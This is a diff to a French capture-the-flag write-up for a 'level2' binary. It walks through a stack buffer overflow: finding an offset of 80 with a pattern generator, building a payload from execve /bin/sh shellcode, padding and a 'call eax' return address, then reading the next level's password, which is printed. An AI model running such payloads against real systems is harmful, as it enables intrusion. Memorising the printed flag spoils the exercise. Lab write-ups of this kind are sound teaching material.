@@ -146,17 +146,36 @@ Après quelques recherches dans les fonctions importées par le programme, on tr
         0x080484cf <+31>:	call   eax
       [...]
       ```
-Puisque le strdup() stocke son output dans eax, en théorie on peut écrire un exploit dans l'input du gets() et utiliser l'adresse du call eax découvert dans frame_dummy pour réécrire l'EIP !
+Puisque le strdup() stocke son output dans eax, en théorie on peut écrire un exploit dans l'input du gets() et utiliser l'adresse du call eax découvert dans frame_dummy (`0x080484cf`) pour réécrire l'EIP et faire exécuter notre exploit depuis eax !
+
+On va se servir d'un [générateur de pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) pour trouver l'offset plus rapidement:
+
+- `echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag" > /tmp/exploit`
+- `gdb level2`
+  - `run < /tmp/exploit`
+  ```
+  Program received signal SIGSEGV, Segmentation fault.
+  0x37634136 in ?? ()
+  ```
+  - on rentre 0x37634136 dans le générateur de pattern et il nous donne un offset de 80.
 
 Nous créons donc un payload à l'aide du shellcode trouvé dans le lien suivant : http://shell-storm.org/shellcode/files/shellcode-219.php
 
-Auquel nous ajoutons des caractères de remplissage ici des A puis l'adresse du call eax pour réecrire l'EIP.
+On a 80 octets avant d'écraser l'EIP, donc on écrit les 21 octets de notre shellcode, 59 octets random (80 - 21) et notre adresse en little endian:
+  - `python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\xcf\x84\x04\x08"' > /tmp/exploit`
 
-```python
-sc = b""
-sc += b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
-sc += b"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
-sc += b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
-print (sc + ((80 - len(sc)) * 'A') + '\xcf\x84\x04\x08')
-```
-Enfin nous lançons le programme avec le payload malicieux comme au level précédent.
+Enfin nous lançons le programme avec le payload malicieux comme au level précédent:
+  - `cat /tmp/exploit - | ./level2`
+    ```
+       j
+    X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAτ
+    
+    ```
+    - `whoami`
+      ```
+      level3
+      ```
+      - `cat /home/user/level3/.pass`
+        ```
+        492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+        ```
